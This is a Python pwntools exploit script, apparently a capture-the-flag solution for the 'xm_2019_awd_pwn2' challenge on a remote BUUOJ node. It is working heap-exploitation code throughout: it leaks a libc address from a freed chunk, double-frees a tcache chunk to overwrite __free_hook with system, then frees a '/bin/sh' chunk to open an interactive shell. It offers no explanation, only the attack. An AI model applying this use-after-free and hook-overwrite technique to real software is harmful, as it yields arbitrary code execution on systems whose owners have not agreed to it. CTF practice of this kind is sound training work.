# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './xm_2019_awd_pwn2'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28659'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size,content = 'a'):
    cmd(1)
    sla('size:',size)
    sla('content:',content)

def delete(id):
    cmd(2)
    sla('idx:',id)

def show(id):
    cmd(3)
    sla('idx:',id)

# one_gad = one_gadget(libc.path)

add(0x450)
add(0x18)
add(0x18,'/bin/sh\x00')
add(0x20)

delete(0)

show(0)
libc_addr = l64() - 0x70
libc.address = libc_addr - libc.sym['__malloc_hook']
__free_hook = libc.sym['__free_hook']
system = libc.sym['system']

delete(1)
delete(1)

add(0x18,p64(__free_hook))
add(0x18,p64(__free_hook))
add(0x18,p64(system))
# dbg()

delete(2)

# dbg()



p.interactive()

'''
@File    :   xm_2019_awd_pwn2.py
@Time    :   2021/08/20 11:25:53
@Author  :   Niyah 
'''